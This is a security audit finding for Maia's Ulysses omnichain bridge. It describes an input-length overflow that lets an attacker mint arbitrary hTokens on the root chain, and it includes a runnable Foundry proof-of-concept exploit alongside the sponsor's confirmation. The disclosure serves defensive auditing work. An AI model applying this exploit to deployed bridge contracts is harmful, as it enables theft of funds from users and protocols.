[H-12] An attacker can mint an arbitrary amount ofhTokenonRootChain
Submitted byVoyvoda
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L275-L316https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgentExecutor.sol#L259-L299https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L404-L426https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootPort.sol#L276-L284
Impact
An adversary can construct an attack vector that let’s them mint an arbitrary amount of hToken’s on theRootChain.
Proof of Concept
Note: An end-to-end coded PoC is at the end of PoC section.
Background
The attack will start on a Branch Chain where we have some underlying ERC20tokenand a correspondinghTokenthat representstokenwithin the omnichain system. ThecallOutSignedAndBridgeMultiple(...)function is supposed to bridge multiple tokens to a destination chain and also carry themsg.senderso that the tokens can be credited tomsg.sender’sVirtualAccount. The attacker will call the function withDepositMultipleInputParams_dParamsthat take advantage of several weaknesses contained within the function.
Below is an overview of theDepositMultipleInputstruct and flow diagram ofBranchBridgeAgent:
structDepositMultipleInput{//Deposit Infoaddress[]hTokens;//Input Local hTokens Address.address[]tokens;//Input Native / underlying Token Address.uint256[]amounts;//Amount of Local hTokens deposited for interaction.uint256[]deposits;//Amount of native tokens deposited for interaction.uint24toChain;//Destination chain for interaction.}
flowchart TBA["callOutSignedAndBridgeMultiple(,DepositMultipleInput memory _dParams,)"]-->|1 |B["_depositAndCallMultiple(...)"]B --> |2| C["_createDepositMultiple(...)"]B --> |4| D["__performCall(_data)"]C --> |3| E["IPort(address).bridgeOutMultiple(...)"]
Weakness#1is that the supplied array of tokensaddress[] hTokensin_dParamsis not checked if it exceeds 256. This causes an obvious issue where ifhTokenslength is>256, the recorded length inpackedDatawill be wrong since it’s using an unsafe cast touint8and will overflow:uint8(_dParams.hTokens.length).
functioncallOutSignedAndBridgeMultiple(bytescalldata_params,DepositMultipleInputmemory_dParams,uint128_remoteExecutionGas)externalpayablelockrequiresFallbackGas{// code ...//Encode Data for cross-chain call.bytesmemorypackedData=abi.encodePacked(bytes1(0x06),msg.sender,uint8(_dParams.hTokens.length),depositNonce,_dParams.hTokens,_dParams.tokens,_dParams.amounts,_deposits,_dParams.toChain,_params,msg.value.toUint128(),_remoteExecutionGas);// code ..._depositAndCallMultiple(...);}
Weakness#2arises in the subsequent internal function_depositAndCallMultiple(...), where the only check performed on the suppliedhTokens,tokens,amountsanddepositsarrays is if the lengths match; however, there is no check if the length is the same as the one passed earlier topackedData.
function_depositAndCallMultiple(address_depositor,bytesmemory_data,address[]memory_hTokens,address[]memory_tokens,uint256[]memory_amounts,uint256[]memory_deposits,uint128_gasToBridgeOut)internal{//Validate Inputif(_hTokens.length!=_tokens.length||_tokens.length!=_amounts.length||_amounts.length!=_deposits.length)revertInvalidInput();//Deposit and Store Info_createDepositMultiple(_depositor,_hTokens,_tokens,_amounts,_deposits,_gasToBridgeOut);//Perform Call_performCall(_data);}
Lastly, weakness#3is thatbridgeOutMultiple(...), called within_createDepositMultiple(...), allows for supplying any address in thehTokensarray since it only performs operations on these addresses if_deposits[i] > 0or_amounts[i] - _deposits[i] > 0. In other words, if we setdeposits[i] = 0andamounts[i] = 0, we can supply ANY address inhTokens[i].
functionbridgeOutMultiple(address_depositor,address[]memory_localAddresses,address[]memory_underlyingAddresses,uint256[]memory_amounts,uint256[]memory_deposits)externalvirtualrequiresBridgeAgent{for(uint256i=0;i<_localAddresses.length;) {if(_deposits[i] >0) {_underlyingAddresses[i].safeTransferFrom(_depositor,address(this),_denormalizeDecimals(_deposits[i],ERC20(_underlyingAddresses[i]).decimals()));}if(_amounts[i] -_deposits[i] >0) {_localAddresses[i].safeTransferFrom(_depositor,address(this),_amounts[i] -_deposits[i]);ERC20hTokenBranch(_localAddresses[i]).burn(_amounts[i] -_deposits[i]);}unchecked{i++;}}}
Supplying the attack vector
The attacker will constructDepositMultipleInput _dParamswhereaddress[] hTokenswill have a length of 257 where all entries, excepthTokens[1],hTokens[2]andhTokens[3], will contain the Branch address of the samehToken. Note that, in the examined functions above, there is no restriction to supply the samehTokenaddress multiple times.
In a similar way,address[] tokenswill have a length of 257; however, here all entries will contain the underlyingtoken. It is crucial to include the address of the underlyingtokento bypass_normalizeDecimals.
Nextuint256[] amountswill be of length 257, where all entries will contain 0. Similarly,uint256[] depositswill be of length 257, where all entries will contain 0. In such configuration, the attacker is able to supply a malicioushTokenaddress as per weakness#3.
The crucial part now, is thathTokens[1]will contain the address of the underlyingtoken. This is needed to later bypass the params check on theRootChain.
hTokens[2] & hTokens[3]will contain the attacker’s malicious payload address, which when converted to bytes and thenuint256, will represent the arbitrary amount of tokens that the attacker will mint (this conversion will happen on theRootChain).
This is how the attack vector looks expressed in code:
// hToken address, note the "h" in the var nameaddressaddr1=avaxMockAssethToken;// underlying addressaddressaddr2=address(avaxMockAssetToken);// 0x2FAF0800 when packed to bytes and then cast to uint256 = 800000000// this amount will be minted on Rootaddressmalicious_address=address(0x2FAF0800);uint256amount1=0;uint256amount2=0;uintnum=257;address[]memoryhtokens=newaddress[](num);address[]memorytokens=newaddress[](num);uint256[]memoryamounts=newuint256[](num);uint256[]memorydeposits=newuint256[](num);for(uinti=0;i<num;i++) {htokens[i] =addr1;tokens[i] =addr2;amounts[i] =amount1;deposits[i] =amount2;}// address of the underlying tokenhtokens[1] =addr2;// copy of entry containing the arbitrary number of tokenshtokens[2] =malicious_address;// entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Roothtokens[3] =malicious_address;uint24toChain=rootChainId;// create inputDepositMultipleInputmemoryinput=DepositMultipleInput({hTokens:htokens,tokens:tokens,amounts:amounts,deposits:deposits,toChain:toChain});
Essentially, what happens now is the attacker haspackedDatathat contains 257hTokens,tokens,amountsanddeposits; however, due to weakness#1the recorded length is 1 and due to weaknesses#2and#3, this construction of the input will reach_peformCal(data). The mismatch between the number of entries and the actual number of supplied entries will cause malicious behavior on theRootChain.
bytesmemorypackedData=abi.encodePacked(bytes1(0x06),msg.sender,uint8(_dParams.hTokens.length),depositNonce,_dParams.hTokens,_dParams.tokens,_dParams.amounts,_deposits,_dParams.toChain,_params,msg.value.toUint128(),_remoteExecutionGas);
The attack vector is in line with the general encoding scheme displayed below. The important note is that “Length” will contain a value of 1 instead of 257, which will disrupt the decoding on theRootBranch. More details about the encoding can be found inIRootBridgeAgent.sol.
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+|  Flag  |  Signer  | Length | depositNonce | hTokens[0], [1] ... [256] | tokens[0] ... [256] | amounts[0] ... [256] | deposits[0] ... [256] | toChain | data |   gas    |+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+| 1 byte | 20 bytes | 1 byte |   4 bytes    |       32 bytes * 257      |    32 bytes * 257   |    32 bytes * 257    |     32 bytes * 257    | 3 bytes | any  | 32 bytes |+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
RootBranchreceives the attack vector
The entry point for a message on theRootChainisanyExecute(bytes calldata data)inRootBridgeAgent.sol. This will be called by theMultichain’sAnycallExecutor. The function will unpack and navigate the supplied flag0x06, corresponding tocallOutSignedAndBridgeMultiple(...)that was invoked on the Branch Chain.
Next,executeSignedWithDepositMultiple(...)will be invoked residing inRootBridgeAgentExecutor.sol, which will subsequently call_bridgeInMultiple(...); however, the amount of data passed to_bridgeInMultiple(...)depends on the packed length of thehTokensarray:
function executeSignedWithDepositMultiple(address _account,address _router,bytes calldata _data,uint24 _fromChainId) external onlyOwner returns (bool success, bytes memory result) {//Bridge In AssetsDepositMultipleParams memory dParams = _bridgeInMultiple(_account,_data[PARAMS_START_SIGNED:PARAMS_END_SIGNED_OFFSET+ uint16(uint8(bytes1(_data[PARAMS_START_SIGNED]))) * PARAMS_TKN_SET_SIZE_MULTIPLE],_fromChainId);// more code ...
If we examine closer, the constants and check with the encoding scheme:
PARAMS_START_SIGNED= 21PARAMS_END_SIGNED_OFFSET= 29PARAMS_TKN_SET_SIZE_MULTIPLE= 128
Here, the intended behavior is that_datais sliced in such a way that it removes the flagbytes1(0x06)and themsg.senderaddress. Hence, we start at byte21 - we have 29 to account for thebytes4(nonce),bytes3(chainId)andbytes1(length)for a total of 8 bytes. But remember that byte slicing is exclusive of thesecond byte index + uint16(length) * 128for every set ofhtoken,token,amountanddeposit. What will happen in the attack case is that_datawill be cut short since the length will be 1 instead of 257 and_datawill contain length, nonce, chainId and the first 4 entries of the constructedhTokens[]array.
Now,_bridgeInMultiplewill unpack the_dParamswherenumOfAssets = 1; hence, only 1 iteration, and will populate a set with in reality the first 4 entries of the suppliedhTokens[]in the attack vector:
hTokens[0] = hToken addresstokens[0] = token addressamounts[0] = malicious address payload cast to uint256deposits[0] = malicious address payload cast to uint256
function_bridgeInMultiple(address_recipient,bytescalldata_dParams,uint24_fromChain)internalreturns(DepositMultipleParamsmemorydParams){// Parse Parametersuint8numOfAssets=uint8(bytes1(_dParams[0]));uint32nonce=uint32(bytes4(_dParams[PARAMS_START:5]));uint24toChain=uint24(bytes3(_dParams[_dParams.length-3:_dParams.length]));address[]memoryhTokens=newaddress[](numOfAssets);address[]memorytokens=newaddress[](numOfAssets);uint256[]memoryamounts=newuint256[](numOfAssets);uint256[]memorydeposits=newuint256[](numOfAssets);for(uint256i=0;i<uint256(uint8(numOfAssets));) {//Parse ParamshTokens[i] =address(uint160(bytes20(bytes32(_dParams[PARAMS_TKN_START+ (PARAMS_ENTRY_SIZE*i) +12:PARAMS_TKN_START+ (PARAMS_ENTRY_SIZE* (PARAMS_START+i))]))));tokens[i] =address(uint160(bytes20(_dParams[PARAMS_TKN_START+PARAMS_ENTRY_SIZE*uint16(i+numOfAssets) +12:PARAMS_TKN_START+PARAMS_ENTRY_SIZE*uint16(PARAMS_START+i+numOfAssets)])));amounts[i] =uint256(bytes32(_dParams[PARAMS_TKN_START+PARAMS_AMT_OFFSET*uint16(numOfAssets) + (PARAMS_ENTRY_SIZE*uint16(i)):PARAMS_TKN_START+PARAMS_AMT_OFFSET*uint16(numOfAssets)+PARAMS_ENTRY_SIZE*uint16(PARAMS_START+i)]));deposits[i] =uint256(bytes32(_dParams[PARAMS_TKN_START+PARAMS_DEPOSIT_OFFSET*uint16(numOfAssets) + (PARAMS_ENTRY_SIZE*uint16(i)):PARAMS_TKN_START+PARAMS_DEPOSIT_OFFSET*uint16(numOfAssets)+PARAMS_ENTRY_SIZE*uint16(PARAMS_START+i)]));unchecked{++i;}}//Save Deposit Multiple ParamsdParams=DepositMultipleParams({numberOfAssets:numOfAssets,depositNonce:nonce,hTokens:hTokens,tokens:tokens,amounts:amounts,deposits:deposits,toChain:toChain});RootBridgeAgent(payable(msg.sender)).bridgeInMultiple(_recipient,dParams,_fromChain);}
Subsequently,bridgeInMultiple(...)is called inRootBridgeAgent.sol, wherebridgeIn(...)is called for every set ofhToken,token,amountanddeposit; one iteration in the attack scenario.
FunctionbridgeIn(...)now performs the criticalcheckParamsfrom theCheckParamsLiblibrary where if only 1 of 3 conditions istrue, we will have a revert.
The first check is reverted if_dParams.amount < _dParams.deposit. This is “false” sinceamountanddepositare equal to theuint256cast of thebytespacking of the malicious address payload.
The second check is:
(_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain))
Here, it’s trueamount > 0; however,_dParams.hTokenis the first entryhTokens[0]of the attack vector’shTokens[]array. Therefore, it is a valid address andisLocalToken(...)will return “true” and will be negated by!, which will make the statement “false” because of&&. Therefore, it is bypassed.
The third check is:
(_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain))
Here, it’s truedeposit > 0; however,_dParams.tokenis the second entryhTokens[1]of the attack vector’shTokens[]array. Therefore, it is a valid underlying address andisUnderlyingToken(...)will return “true” and will be negated by!, which will make the statement “false” because of&&. Therefore, it is bypassed.
Entire functioncheckParams(...):
functioncheckParams(address_localPortAddress,DepositParamsmemory_dParams,uint24_fromChain)internalviewreturns(bool){if((_dParams.amount<_dParams.deposit)//Deposit can't be greater than amount.|| (_dParams.amount>0&& !IPort(_localPortAddress).isLocalToken(_dParams.hToken,_fromChain))//Check local exists.|| (_dParams.deposit>0&& !IPort(_localPortAddress).isUnderlyingToken(_dParams.token,_fromChain))//Check underlying exists.) {returnfalse;}returntrue;}
Now, back tobridgeIn(...)inRootBridgeAgent, we get theglobalAddressfor_dParams.hToken(again this is the validhToken[0]address from Branch Chain) andbridgeToRoot(...)is called that resides inRootPort.sol.
//Get global addressaddressglobalAddress=IPort(localPortAddress).getGlobalTokenFromLocal(_dParams.hToken,_fromChain);//Check if valid assetif(globalAddress==address(0))revertInvalidInputParams();//Move hTokens from Branch to Root + Mint Sufficient hTokens to match new port depositIPort(localPortAddress).bridgeToRoot(_recipient,globalAddress,_dParams.amount,_dParams.deposit,_fromChain);
The functionbridgeToRoot(...)will check if theglobalAddressis valid and it is since we got it from the validhTokens[0]entry in the constructed attack. Then,_amount - _deposit = 0; therefore, no tokens will be transferred and finally, the critical lineif (_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId). Here,_depositis the malicious address payload that was packed to bytes and then unpacked and cast touint256. Then,_hTokenis the global address that we got fromhTokens[0]back in the unpacking. Therefore, whatever the value of theuint256representation of the malicious address is will be minted to the attacker.
Coded PoC
Copy the two functionstestArbitraryMintand_prepareAttackVectorintest/ulysses-omnichain/RootTest.t.soland place them in theRootTestcontract after the setup.
Execute withforge test --match-test testArbitraryMint -vv
The result is800000000in minted tokens for free in the attacker’sVirtualAccount.
functiontestArbitraryMint()public{// setup function used by developers to add local/global tokens in the systemtestAddLocalTokenArbitrum();// set attacker address & mint 1 ether to cover gas costaddressattacker=address(0xAAAA);hevm.deal(attacker,1ether);// get avaxMockAssetHtoken global address that's on the RootaddressglobalAddress=rootPort.getGlobalTokenFromLocal(avaxMockAssethToken,avaxChainId);// prepare attack vectorbytesmemoryparams="";DepositMultipleInputmemorydParams=_prepareAttackVector();uint128remoteExecutionGas=200_000_000_0;console2.log("------------------");console2.log("------------------");console2.log("ARBITRARY MINT LOG");console2.log("Attacker address",attacker);console2.log("Avax h token address",avaxMockAssethToken);console2.log("Avax underlying address",address(avaxMockAssetToken));console2.log("Attacker h token balance",ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));console2.log("Attacker underlying balance",avaxMockAssetToken.balanceOf(attacker));// execute attackhevm.prank(attacker);avaxMulticallBridgeAgent.callOutSignedAndBridgeMultiple{value:0.00005ether}(params,dParams,remoteExecutionGas);// get attacker's virtual account addressaddressvaccount=address(rootPort.getUserAccount(attacker));console2.log("Attacker h token balance avax",ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));console2.log("Attacker underlying balance avax",avaxMockAssetToken.balanceOf(attacker));console2.log("Attacker h token balance root",ERC20hTokenRoot(globalAddress).balanceOf(vaccount));console2.log("ARBITRARY MINT LOG END");console2.log("------------------");}function_prepareAttackVector()internalviewreturns(DepositMultipleInputmemory) {// hToken addressaddressaddr1=avaxMockAssethToken;// underlying addressaddressaddr2=address(avaxMockAssetToken);// 0x2FAF0800 when encoded to bytes and then cast to uint256 = 800000000addressmalicious_address=address(0x2FAF0800);uint256amount1=0;uint256amount2=0;uintnum=257;address[]memoryhtokens=newaddress[](num);address[]memorytokens=newaddress[](num);uint256[]memoryamounts=newuint256[](num);uint256[]memorydeposits=newuint256[](num);for(uinti=0;i<num;i++) {htokens[i] =addr1;tokens[i] =addr2;amounts[i] =amount1;deposits[i] =amount2;}// address of the underlying tokenhtokens[1] =addr2;// copy of entry containing the arbitrary number of tokenshtokens[2] =malicious_address;// entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Roothtokens[3] =malicious_address;uint24toChain=rootChainId;// create inputDepositMultipleInputmemoryinput=DepositMultipleInput({hTokens:htokens,tokens:tokens,amounts:amounts,deposits:deposits,toChain:toChain});returninput;}
Recommendation
Enforce stricter checks around input param validation on bridging multiple tokens.
Assessed type
Invalid Validation
0xBugsy (Maia) confirmed and commented:
The maximum 256 length should be enforced so the encodedN(length)value is truthful. In addition,CheckParamsshould check if the underlying token matches thehTokeninstead of only checking if it’s an underlying token in the system.
0xLightt (Maia) commented:
Addressedhere.